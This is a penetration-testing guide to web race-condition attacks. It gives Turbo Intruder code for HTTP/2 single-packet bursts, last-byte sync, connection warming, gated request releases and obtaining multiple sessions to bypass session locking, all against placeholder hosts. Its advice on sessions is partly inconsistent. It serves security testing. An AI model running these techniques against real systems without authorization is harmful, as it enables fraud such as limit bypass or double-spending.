# Advanced Race Techniques (Single-Packet, Last-Byte Sync, Connection Warming, Gates)

## When this applies

- The straightforward parallel send (Burp tab group) doesn't reliably collide.
- Network jitter, session locking, or rate limits make timing inconsistent.
- You need higher precision than Burp's GUI provides.

## Technique

Use HTTP/2 single-packet attack, last-byte synchronization (HTTP/1.1), connection warming, and Turbo Intruder gates to compress the request burst into the smallest possible window.

## Steps

### HTTP/2 single-packet attack

```python
engine = RequestEngine(
    endpoint=target.endpoint,
    concurrentConnections=1,  # Single connection
    engine=Engine.BURP2       # HTTP/2 support
)
```

**Requirements:**
- Burp Suite 2023.9+
- Target supports HTTP/2
- Single TCP packet contains all requests

**Advantages:**
- Eliminates network jitter
- Maximum timing precision
- Highest success rate

### Last-byte synchronization (HTTP/1.1)

**Concept:**
- Withhold last byte of each request
- Send all final bytes simultaneously
- Reduces timing variance

```python
engine = RequestEngine(
    endpoint=target.endpoint,
    concurrentConnections=10,
    engine=Engine.THREADED  # HTTP/1.1
)
```

### Connection warming

**Purpose:** Reduce latency variance.

```http
# Send 5 warming requests first
GET / HTTP/2
Host: target.com

# Then execute race attack
POST /api/endpoint HTTP/2
Host: target.com
```

**Effect:**
- First request: ~850ms
- Warmed requests: ~120ms
- More consistent timing

### Session locking bypass

**Problem:** PHP/frameworks lock one request per session.

```http
# Request 1: Session A
POST /api HTTP/2
Cookie: session=SESSION_A

# Request 2: Session B
POST /api HTTP/2
Cookie: session=SESSION_B
```

**Obtaining multiple sessions:**
```bash
# Browser 1
curl -c cookies1.txt https://target.com/

# Browser 2
curl -c cookies2.txt https://target.com/

# Use different cookies in requests
```

### Gate mechanism

**Single Gate:**
```python
for i in range(20):
    engine.queue(request, gate='attack1')

engine.openGate('attack1')  # All released simultaneously
```

**Multiple Gates (Staged):**
```python
# Stage 1: Setup
engine.queue(setupReq, gate='stage1')
engine.openGate('stage1')

time.sleep(1)

# Stage 2: Attack
for i in range(20):
    engine.queue(attackReq, gate='stage2')
engine.openGate('stage2')
```

### Common Mistakes

**Mistake 1: Sequential Requests**
```python
# Wrong:
for i in range(20):
    engine.queue(request)
    engine.start()  # Don't start in loop!

# Correct:
for i in range(20):
    engine.queue(request, gate='race1')

engine.openGate('race1')  # Start all at once
```

**Mistake 2: Different Sessions**
```
Wrong:
Request 1: Cookie: session=ABC
Request 2: Cookie: session=XYZ
Result: No collision (different users)

Correct:
Request 1: Cookie: session=ABC
Request 2: Cookie: session=ABC
Result: Collision possible
```

**Mistake 3: Missing Request Termination**
```python
# Wrong:
request = '''POST /api HTTP/2
Host: target.com

data=value'''  # Missing \r\n\r\n

# Correct:
request = '''POST /api HTTP/2
Host: target.com

data=value

'''  # Ends with \r\n\r\n
```

**Mistake 4: Insufficient Volume**
```python
# Wrong:
for i in range(5):  # Too few!
    engine.queue(request, gate='race')

# Correct:
for i in range(50):  # Enough for narrow windows
    engine.queue(request, gate='race')
```

**Mistake 5: Ignoring State**
```
Wrong:
Attempt 1: Success
Attempt 2: Failure (state changed!)

Correct:
1. Reset application state between attempts
2. Use different test accounts
3. Clear cart/sessions
```

## Verifying success

- Single-packet TCP capture (Wireshark) confirms all request final bytes arrive in one packet.
- Response timing graph shows synchronized arrival within microseconds.
- Higher success rate (>50% across 10 trials) compared to GUI-only approach.

## Common pitfalls

- Burp older than 2023.9 lacks single-packet attack — upgrade.
- Some servers reject HTTP/2 from CLI tools — use Burp's stack via Turbo Intruder.
- Connection warming requires the same connection used for the attack — `Engine.BURP2` keeps it open.

## Tools

- Burp Turbo Intruder (`Engine.BURP2`, `Engine.THREADED`)
- h2spacex (raw HTTP/2 socket attacks)
- Raceocat
- Wireshark (TCP packet inspection)
- Burp Logger++ (timing analysis)
